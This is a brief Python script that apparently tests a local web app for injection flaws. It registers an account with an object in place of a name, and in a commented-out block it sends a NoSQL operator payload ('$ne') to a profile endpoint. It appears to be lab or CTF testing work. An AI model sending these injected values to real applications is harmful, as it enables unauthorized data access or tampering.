import requests
import sys

ip = 'http://localhost'
session = requests.Session()
headers = {"Content-Type": "application/json; charset=utf-8"}
"""
payload = {'email': 'underdogv2@hotmail.com', 'password': 'lol12345678!'}
login = session.post(ip+':5000/login', headers=headers, json=payload)

sid = session.cookies['connect.sid']
headers = {"Content-Type": "application/json; charset=utf-8",
           'Cookie': 'connect.sid='+sid}
payload = {'vars': {'name': {"$ne": "a"}}}
add = session.post(ip+':5000/profile/modify', headers=headers, json=payload)
print(add.text)
"""
payload = {'name': {}, 'email': 'underdogv2f@hotmail.com',
           'password': 'lol12345678!'}
add = session.post(ip+':5000/register', headers=headers, json=payload)
print(add.text)
